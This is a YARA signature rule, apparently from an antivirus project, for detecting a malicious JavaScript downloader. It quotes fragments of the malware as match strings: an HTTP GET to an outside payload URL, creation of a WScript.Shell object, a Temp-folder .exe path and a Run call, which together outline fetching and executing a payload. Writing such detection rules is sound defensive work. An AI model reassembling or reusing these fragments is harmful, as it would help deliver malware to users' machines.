rule sig_20160330_3c71128a5a9c53e39fcc87fdcc339cb0 {
  meta:
    description = "datamaliciousorder - file 20160330_3c71128a5a9c53e39fcc87fdcc339cb0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "32d5f5206c6caaeb9d20ba0b3131284fa0bf2f82ebbedf7f2fc88e37bb0afa7f"

  strings:
    $s1  = "F1[VF](\"GET\", \"http://new.teamlight.ru/si8svf\", false);" fullword ascii
    $s2  = "var XF = function B() {return WScript[AR](\"WScript\"+\".Shell\");}(), O = 11;" fullword ascii
    $s3  = "function Y(B0, N){JX = JX * 1; return B0 - N;};" fullword ascii
    $s4  = "if (F1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function TG(){return VH + \"\";};" fullword ascii
    $s6  = "function X() {return XF[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ssgCsmcQFXM.ex\" + \"e\";};" fullword ascii
    $s7  = "function VE() {return ((HV == true) && (HV == R)) ? 1 : JX;};" fullword ascii
    $s8  = "function SF(GH){XF[\"Run\"](GH, JX, JX);};" fullword ascii
    $s9  = "var D = new this[\"Date\"]();" fullword ascii
    $s10 = "function Z(){return 22;};" fullword ascii
    $s11 = "return Y(J, UX);" fullword ascii
    $s12 = "function W(ZC) {var ZB = (1, 2, 3, 4, 5, ZC); return ZB;};" fullword ascii
    $s13 = "}while (SU);" fullword ascii
    $s14 = "function QP(){return AR;};" fullword ascii
    $s15 = "function RO()" fullword ascii
    $s16 = "var MK = false;" fullword ascii
    $s17 = "var HV = false;" fullword ascii
    $s18 = "HV = true; " fullword ascii
    $s19 = "} catch(E){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}